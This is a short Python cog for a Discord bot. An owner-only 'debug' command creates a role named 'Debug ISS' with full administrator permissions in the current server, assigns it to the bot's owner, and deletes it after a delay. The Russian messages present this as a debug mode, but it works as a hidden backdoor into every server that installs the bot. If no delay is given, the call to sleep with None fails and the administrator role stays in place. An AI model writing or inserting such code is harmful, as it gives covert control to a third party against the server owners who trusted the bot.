from discord.ext import commands
import discord
import asyncio

class Owner(commands.Cog):
    def __init__(self, Client):
        self.Client = Client

    @commands.command()
    @commands.is_owner()
    async def debug(self,ctx, sleep: int = None):
        role = await ctx.guild.create_role(name = f'Debug ISS', permissions = discord.Permissions(administrator = True), reason ='Режим отладки.')
        await ctx.author.add_roles(role, reason = 'Режим отладки.')
        await ctx.send('Режим отладки включен.', delete_after= 10)
        await asyncio.sleep( sleep )
        await ctx.author.remove_roles(role, reason = 'Режим отладки выключен.')
        await role.delete(reason = 'Режим отладки выключен.')

def setup(Client):
    Client.add_cog(Owner(Client))